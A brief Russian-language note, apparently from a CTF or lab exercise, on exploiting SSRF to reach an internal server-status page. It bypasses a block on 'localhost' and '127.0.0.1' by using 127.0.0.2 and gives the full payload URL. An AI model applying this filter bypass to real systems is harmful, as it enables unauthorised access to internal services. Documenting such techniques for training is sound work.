SSRF на server-status/

localhost и 127.0.0.1 забанены, обходим, например, с помощью 127.0.0.2

http://localhost:31337/look?url=http://127.0.0.2/server-status
